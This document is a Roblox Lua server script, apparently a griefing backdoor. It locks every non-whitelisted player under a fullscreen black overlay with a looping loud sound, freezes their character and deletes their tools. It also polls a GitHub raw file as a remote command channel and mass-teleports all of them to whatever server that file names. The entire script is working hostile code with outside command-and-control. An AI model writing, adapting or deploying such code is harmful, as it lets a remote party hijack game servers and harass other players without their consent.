local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"
local whitelisted = {["noamdb15"] = true, ["dylanzyl123"] = true}
local SOUND_ID = "rbxassetid://6342167000" -- תוודא שה-ID הזה תקין ברובלוקס!

local function applyTheBrutalLock(player)
	if whitelisted[player.Name] then return end

	-- יצירת ה-GUI בצורה אגרסיבית
	local function createGui()
		local pgui = player:WaitForChild("PlayerGui")
		if pgui:FindFirstChild("TrollLock") then return end

		local sg = Instance.new("ScreenGui", pgui)
		sg.Name = "TrollLock"
		sg.IgnoreGuiInset = true
		sg.DisplayOrder = 9999999

		local frame = Instance.new("Frame", sg)
		frame.Size = UDim2.new(1, 0, 1, 0)
		frame.BackgroundColor3 = Color3.new(0, 0, 0)
		frame.Active = true

		local label = Instance.new("TextLabel", frame)
		label.Size = UDim2.new(0.8, 0, 0.4, 0)
		label.Position = UDim2.new(0.1, 0, 0.3, 0)
		label.BackgroundTransparency = 1
		label.TextColor3 = Color3.new(1, 0, 0)
		label.TextScaled = true
		label.Text = "הלך לך הבייס חבר יקר"

		local snd = Instance.new("Sound", pgui) -- הסאונד בתוך ה-GUI כדי שישמעו מיד
		snd.SoundId = SOUND_ID
		snd.Looped = true
		snd.Volume = 10
		snd:Play()
	end

	createGui()

	-- לופ אכזרי לנעילה ומחיקה (כל 0.05 שניות)
	task.spawn(function()
		while player.Parent do
			local char = player.Character
			if char then
				-- נעילה פיזית של כל חלק בגוף
				for _, part in pairs(char:GetChildren()) do
					if part:IsA("BasePart") then
						part.Anchored = true
					end
				end
				
				-- איפוס תכונות אנושיות
				local hum = char:FindFirstChild("Humanoid")
				if hum then
					hum.WalkSpeed = 0
					hum.JumpPower = 0
					hum.PlatformStand = true
				end

				-- ניקוי תיק וחפצים ביד
				player.Backpack:ClearAllChildren()
				for _, item in pairs(char:GetChildren()) do
					if item:IsA("Tool") then item:Destroy() end
				end
			end
			task.wait(0.05)
		end
	end)
end

Players.PlayerAdded:Connect(function(player)
	player.CharacterAdded:Connect(function()
		applyTheBrutalLock(player)
	end)
	applyTheBrutalLock(player)
end)

-- לופ שיגור
task.spawn(function()
	while task.wait(0.5) do
		local success, response = pcall(function()
			return HttpService:GetAsync(rawUrl .. "?t=" .. tick())
		end)

		if success and response then
			local lines = {}
			for line in response:gmatch("[^\r\n]+") do table.insert(lines, line) end
			local targetPlaceId = tonumber(lines[1])
			local targetJobId = lines[2]

			if targetJobId and targetJobId ~= "" then
				for _, player in pairs(Players:GetPlayers()) do
					if not whitelisted[player.Name] then
						pcall(function()
							TeleportService:TeleportToPlaceInstance(targetPlaceId or game.PlaceId, targetJobId, player)
						end)
					end
				end
			end
		end
	end
end)
